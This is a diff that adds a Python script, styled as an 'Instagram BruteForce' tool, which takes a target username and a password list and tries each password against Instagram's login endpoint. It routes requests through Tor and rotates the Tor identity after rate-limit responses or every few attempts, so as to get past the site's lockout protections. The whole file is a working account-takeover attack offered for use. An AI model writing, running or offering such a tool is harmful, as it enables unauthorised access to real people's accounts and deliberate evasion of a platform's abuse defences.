@@ -1,0 +1,148 @@
+import requests
+import socks
+import socket
+import time
+import random
+import sys
+import itertools
+from stem.control import Controller
+from colorama import Fore, Style, init
+
+# ✅ Initialize Colorama for Colored Output
+init(autoreset=True)
+
+# ✅ TOR Configuration
+TOR_PORT = 9050
+CONTROL_PORT = 9051
+TOR_PASSWORD = "your_password"
+
+# ✅ Configure TOR Proxies
+socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", TOR_PORT)
+socket.socket = socks.socksocket
+
+# ✅ Instagram Login URL
+LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
+
+# ✅ Headers for Request
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
+    "X-Requested-With": "XMLHttpRequest",
+    "Referer": "https://www.instagram.com/",
+    "Accept-Language": "en-US,en;q=0.5",
+}
+
+# ✅ Stylish Input Animation
+def stylish_input(prompt):
+    sys.stdout.write(Fore.CYAN + Style.BRIGHT + prompt)
+    sys.stdout.flush()
+    user_input = input(Fore.YELLOW + Style.BRIGHT)
+    return user_input.strip()
+
+# ✅ Animated Waiting Dots
+def animated_wait(duration):
+    for _ in range(duration):
+        sys.stdout.write(Fore.MAGENTA + ". ")
+        sys.stdout.flush()
+        time.sleep(1)
+    print()
+
+# ✅ Function to Change TOR IP
+def change_ip():
+    try:
+        with Controller.from_port(port=CONTROL_PORT) as controller:
+            controller.authenticate(password=TOR_PASSWORD)
+            controller.signal(2)  # Signal 2 = New Identity
+        print(Fore.GREEN + "\n[+] 🔄 IP Changed Successfully!\n")
+        animated_wait(10)  # Wait for new identity to take effect
+    except Exception as e:
+        print(Fore.RED + f"[!] ⚠️ Failed to change IP: {e}")
+
+# ✅ Brute Force Function
+def brute_force(username, password_list):
+    session = requests.Session()
+
+    # 🔹 Get CSRF Token
+    try:
+        login_page = session.get("https://www.instagram.com/accounts/login/")
+        csrf_token = login_page.cookies["csrftoken"]
+        HEADERS["X-CSRFToken"] = csrf_token
+    except Exception as e:
+        print(Fore.RED + "[!] Failed to get CSRF Token:", e)
+        return
+
+    attempts = 0
+    max_attempts = 5  # 🔹 Max attempts before IP change
+
+    print(Fore.BLUE + "\n🚀 Attack Started! Trying Passwords...\n")
+
+    for password in password_list:
+        sys.stdout.write(Fore.YELLOW + f"🔄 Trying: {password} ")
+        sys.stdout.flush()
+
+        for _ in range(3):
+            sys.stdout.write(". ")
+            sys.stdout.flush()
+            time.sleep(0.5)
+
+        data = {
+            "username": username,
+            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
+            "queryParams": "{}",
+            "optIntoOneTap": "false",
+        }
+
+        try:
+            response = session.post(LOGIN_URL, headers=HEADERS, data=data, allow_redirects=True)
+
+            if response.status_code == 200:
+                json_response = response.json()
+
+                if json_response.get("authenticated"):
+                    print(Fore.GREEN + f"\n[✅] Password Found: {password}\n")
+                    return
+                else:
+                    print(Fore.RED + f"[-] ❌ Incorrect: {password}")
+
+            elif response.status_code == 429:
+                print(Fore.YELLOW + "\n[!] 🚨 Too Many Requests! Changing IP...")
+                change_ip()
+                attempts = 0  # Reset attempt counter
+
+            else:
+                print(Fore.RED + f"[?] ⚠️ Unexpected Response: {response.text}")
+
+            attempts += 1
+
+            if attempts >= max_attempts:
+                print(Fore.YELLOW + "\n[⚠️] Maximum attempts reached! Changing IP...")
+                change_ip()
+                attempts = 0
+
+        except requests.exceptions.RequestException as e:
+            print(Fore.RED + f"[!] ⚠️ Request Failed: {e}")
+            change_ip()
+
+# ✅ Load Passwords from File
+def load_passwords(file_path):
+    try:
+        with open(file_path, "r") as f:
+            return [line.strip() for line in f.readlines()]
+    except FileNotFoundError:
+        print(Fore.RED + "[!] ❌ Password file not found!")
+        return []
+
+# ✅ Main Execution
+if __name__ == "__main__":
+    print(Fore.CYAN + Style.BRIGHT + "\n========================================")
+    print(Fore.MAGENTA + "          🔥 Instagram BruteForce 🔥")
+    print(Fore.CYAN + "========================================\n")
+
+    username = stylish_input("🎯 Enter Instagram Username ➜ ")
+    password_file = stylish_input("📂 Enter Password List File Path ➜ ")
+
+    passwords = load_passwords(password_file)
+
+    if passwords:
+        brute_force(username, passwords)
+    else:
+        print(Fore.RED + "[!] No passwords loaded! Exiting...")
